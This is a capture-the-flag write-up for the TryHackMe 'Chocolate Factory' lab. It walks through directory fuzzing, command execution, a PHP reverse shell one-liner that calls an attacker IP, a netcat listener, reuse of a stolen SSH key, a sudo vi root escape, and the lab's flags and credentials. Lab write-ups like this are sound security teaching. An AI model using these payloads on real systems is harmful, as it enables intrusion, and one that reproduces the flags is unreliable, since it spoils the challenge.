# TryHackMe : Chocolate Factory Writeup

## Recon

I started by performing directory fuzzing using `ffuf` with common extensions:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.old,.bak -u http://10.128.183.95/FUZZ
```

The scan revealed an interesting endpoint:

```text
home.php
```

---

## Initial Access : Remote Command Execution

After opening `home.php`, I found an input field that executed commands directly on the server, leading to Remote Command Execution (RCE).

To obtain a reverse shell, I used the following PHP payload:

```bash
php -r '$sock=fsockopen("192.168.128.91",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

On my attacking machine, I started a Netcat listener:

```bash
nc -lvnp 4444
```

After executing the payload in the web application, I received a shell on the target machine.

---

## Enumeration

While enumerating the web directory, I discovered another file:

```text
validate.php
```

Reading the file contents revealed credentials and an encryption key:

```text
charlie:cn7824
```

and:

```text
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

stored inside:

```text
key_rev_key
```

---

## SSH Access

I enumerated the system and checked Charlie’s home directory. Inside, I found a file named:

```text
teleport
```

The file contained Charlie’s private SSH key.

I copied the key to my attacking machine and saved it as `id_rsa`. Before using it, I fixed the permissions:

```bash
chmod 600 id_rsa
```

Then I authenticated as Charlie using the private key:

```bash
ssh -i id_rsa charlie@10.128.183.95
```

After successfully logging in, I retrieved the user flag:

```bash
cat user.txt
```

Output:

```text
flag{cd5509042371b34e4826e4838b522d2e}
```

---

## Privilege Escalation

To check sudo permissions, I ran:

```bash
sudo -l
```

Output:

```text
User charlie may run the following commands on ip-10-128-183-95:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Although the configuration attempted to prevent execution as root using `!root`, it was still possible to abuse `vi` for shell escape using the technique from [GTFOBins](https://gtfobins.github.io/gtfobins/vi/?utm_source=chatgpt.com).

I executed:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

Then verified root access:

```bash
whoami
```

Output:

```text
root
```

---

## Root Flag

Unlike most machines, there was no direct `root.txt` file. Instead, I found a Python script:

```bash
cat root.py
```

The script used Fernet encryption to decrypt a hidden message:

```python
from cryptography.fernet import Fernet
import pyfiglet

key=input("Enter the key:  ")
f=Fernet(key)

encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'

dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()

display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")

print(display1)
print(display2)
```

The decrypted message was stored in `mess`, but never printed. I modified the script by adding:

```python
print(mess)
```

at the end of the script.

Then I executed:

```bash
python root.py
```

When prompted for the key, I entered:

```text
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

The script decrypted the hidden message and revealed the root flag:

```text
flag{cec59161d338fef787fcb4e296b42124}
```

---

## Flags

### User Flag

```text
flag{cd5509042371b34e4826e4838b522d2e}
```

### Root Flag

```text
flag{cec59161d338fef787fcb4e296b42124}
```